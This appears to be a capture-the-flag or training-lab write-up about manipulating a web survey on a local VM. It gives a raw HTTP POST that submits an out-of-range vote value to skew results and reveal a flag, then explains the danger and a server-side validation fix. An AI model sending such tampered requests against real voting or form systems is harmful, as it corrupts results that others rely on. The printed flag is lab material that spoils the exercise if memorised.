# Survey manipulation

## Description
on the page survey:http://address/index.php?page=survey
we see a survey with 5 names for whom we can vote with values between 1 to 10. Each name has an average vote value visible. We can see that one of the name has an average of 4000+, which is impossible with an average of values between 1 to 10.\
If we inspect the html form, we can see that each possible visible values is associated to the same hidden value for the POST request. If we edit the value to be bigger than 10, either in the html before selecting that answer, or in a http request, we get the flag:
`03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`
## Step to reproduce
Sending the http request:
```
POST /index.php?page=survey HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://192.168.56.101
Connection: keep-alive
Referer: http://192.168.56.101/index.php?page=survey
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Priority: u=0, i
sujet=2&valeur=2000000
```
make the flag appear on the new http page.

## Danger
A single user can modify the result of a community vote, which could have important consequences depending on the subject of the vote.

## Recommended fix
Check the possible values serveur side to only allow values between the set range. It's impossible to stop user from editing their HTTP requests, so the security measures need to be implemented serveur side to not accept invalid ones. (It might also be useful to detect massive automated bot requests, but that apply everywhere, not only on the survey page)
